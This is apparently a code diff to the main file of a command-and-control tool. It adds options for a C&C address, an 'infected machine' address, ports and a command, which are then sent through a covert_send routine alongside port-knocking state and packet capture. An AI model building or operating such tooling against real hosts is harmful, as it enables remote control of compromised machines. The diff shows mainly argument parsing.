@@ -1,6 +1,29 @@
 #include "main.h"
 
+static void print_usage(void) {
+    puts("Usage options: \n"
+            "\t[cnc]\tIP address of Command and Control\n"
+            "\t[in]\tIP address of Infected machine\n"
+            "\t[cport]\tPort on Command and Control\n"
+            "\t[iport]\tPort on Infected machine\n"
+            "\t[cmd]\tCommand to send to the Infected machine\n");
+}
+
+static struct option long_options[] = {
+    {"cnc",     required_argument,  0,  0},
+    {"in",      required_argument,  0,  1},
+    {"cport",   required_argument,  0,  2},
+    {"iport",   required_argument,  0,  3},
+    {"cmd",     required_argument,  0,  4},
+    {0,         0,                  0,  0}
+};
+
 int main(int argc, char **argv){
+    int arg;
+    unsigned short cnc_port, infected_port;
+    char cnc_ip[BUFFERSIZE], infected_ip[BUFFERSIZE];
+    unsigned char cmd[BUFFERSIZE];
+
     char *c = "c";
     char *sip = CNCIP;
     char *dip = INFECTEDIP;
@@ -12,7 +35,46 @@ int main(int argc, char **argv){
     knocking[0] = 0; // initilizing the knocking
     knocking[1] = 0;
 
-    covert_send(sip, dip, sport, dport, data, 0);
+    //user arguments
+    while(1) {
+        int option_index = 0;
+
+        arg = getopt_long(argc, argv, SOCKOPTS, long_options, &option_index);
+
+        if(arg == -1) {
+            break;
+        }
+
+        switch(arg) {
+            case 0:
+                strncpy(cnc_ip, optarg, BUFFERSIZE);
+                printf("CNC IP: %s\n", cnc_ip);
+                break;
+            case 1:
+                strncpy(infected_ip, optarg, BUFFERSIZE);
+                printf("Infected IP: %s\n", infected_ip);
+                break;
+            case 2:
+                cnc_port = atoi(optarg);
+                printf("CNC Port: %hu\n", cnc_port);
+                break;
+            case 3:
+                infected_port = atoi(optarg);
+                printf("Infected Port: %hu\n", infected_port);
+                break;
+            case 4:
+                strncpy(cmd, optarg, BUFFERSIZE);
+                printf("CMD: %s\n", cmd);
+                break;
+            default:
+                print_usage();
+                exit(1);
+        }
+
+    }
+
+    //covert_send(sip, dip, sport, dport, data, 0);
+    covert_send(cnc_ip, infected_ip, cnc_port, infected_port, cmd, 0);
     Packetcapture();
     exit(1);
     return 0;
